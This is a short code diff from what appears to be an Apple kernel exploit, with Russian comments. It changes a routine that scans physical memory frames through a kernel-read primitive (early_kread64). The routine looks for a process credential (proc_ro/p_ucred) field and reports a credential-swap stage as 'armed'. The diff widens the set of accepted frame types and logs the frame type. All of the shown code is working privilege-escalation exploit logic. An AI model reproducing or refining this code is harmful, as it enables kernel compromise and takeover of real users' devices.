@@ -8277,7 +8277,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // 1GB-пол закрывает нижние минные PA.
                             BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2 ||
                                                 t == 0x0e || t == 0x21 || t == 0x37 ||
-                                                t == 0x11 || t == 0x13 || t == 0x17 || t == 0x18);
+                                                t == 0x11 || t == 0x13 || t == 0x17 || t == 0x18 ||
+                                                (t >= 0x2f && t <= 0x36));   // 2.0.12: крошечные типы (~100 кадров)
                             if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
                             if (!whitelisted) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
@@ -8311,8 +8312,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 early_kread64(pkva2 + roOff + 8) == roFp1 &&
                                 early_kread64(pkva2 + roOff + 0x10) == roFp2) {
                                 roFieldPA = pa + roOff;
-                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ★ proc_ro поле: pa=%#llx (p_ucred==ucF + соседи) — PSWAP-B вооружён",
-                                          (unsigned long long)roFieldPA]);
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ★ proc_ro поле: pa=%#llx (p_ucred==ucF + соседи) [тип кадра=%d] — PSWAP-B вооружён",
+                                          (unsigned long long)roFieldPA, t]);
                             }
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] финиш: кадров=%#llx чтений=%llu ucredPA=%#llx roFieldPA=%#llx — %@",
